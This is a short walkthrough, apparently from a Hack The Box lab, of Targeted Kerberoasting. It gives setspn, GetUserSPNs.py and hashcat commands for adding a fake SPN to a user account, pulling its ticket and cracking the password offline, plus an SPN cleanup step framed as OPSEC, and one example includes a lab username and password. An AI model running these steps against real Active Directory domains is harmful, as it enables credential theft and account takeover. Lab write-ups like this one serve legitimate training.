# Targeted Kerberoasting

## What It Is
**Targeted Kerberoasting** is an attack where an attacker with `GenericWrite` (or similar) permissions on a user account *creates* a fake Service Principal Name (SPN) on that account. This makes the account Kerberoastable, allowing the attacker to request a TGS ticket and crack it offline for the account's password.

## Prerequisites
- `GenericWrite` on a target user account (or ability to modify the `servicePrincipalName` attribute)
- Domain credentials to authenticate to the DC
- Access to tools: `setspn` (on target/Windows), `GetUserSPNs.py` (Impacket), `hashcat`

## Attack Chain

### Step 1: Add Fake SPN to Target User
Run from a shell with permissions on the target user (e.g., evil-winrm session as Emily):

```powershell
setspn -a fake/dc.domain.com:80 target_username
```

Verify it was added:
```powershell
setspn -L target_username
```

### Step 2: Request Roastable TGS Ticket
From Kali/attacker machine:

```bash
GetUserSPNs.py domain.com/attacker_user:password -dc-ip <DC_IP> -request-user target_username -outputfile target_tgs.hash
```

Example:
```bash
GetUserSPNs.py administrator.htb/Emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb -dc-ip 10.129.245.95 -request-user ethan -outputfile ethan_tgs.hash
```

### Step 3: Crack the TGS Hash Offline
Use hashcat mode **13100** (Kerberos 5 TGS-REP):

```bash
hashcat -m 13100 -a 0 target_tgs.hash /usr/share/wordlists/rockyou.txt
```

## Cleanup
Remove the fake SPN after exploitation (good OPSEC):

```powershell
setspn -d fake/dc.domain.com:80 target_username
```

## Key Distinctions
| Attack | SPN Source | Required Permission |
|--------|------------|---------------------|
| **Kerberoasting** | Existing SPNs on accounts | Ability to request TGS (any domain user) |
| **Targeted Kerberoasting** | Fake SPN you create | `GenericWrite` on target user account |

## References
- HTB Box: Administrator (2026-04-09)
- Emily → Ethan abuse path
